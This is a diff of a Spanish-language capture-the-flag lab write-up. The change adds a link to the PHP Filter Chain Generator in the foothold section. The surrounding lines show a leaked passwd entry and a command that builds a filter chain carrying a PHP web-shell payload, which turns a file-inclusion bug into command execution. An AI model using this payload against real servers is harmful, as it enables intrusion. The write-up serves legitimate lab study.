@@ -121,7 +121,7 @@ lin:x:1001:1001:lin,,,:/home/lin:/bin/bash
 ---
 ## Foothold
 
-Utilizo la herramienta [PHP Filter Chain Generator]() para explotar la vulnerabilidad LFI y generar una cadena que permita la ejecución de comandos.
+Utilizo la herramienta [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) para explotar la vulnerabilidad LFI y generar una cadena que permita la ejecución de comandos.
 
 ```terminal
 /home/kali/Documents/dockerlabs/lfi.elf:-$ python3 /home/kali/Documents/tools/php_filter_chain_generator/php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
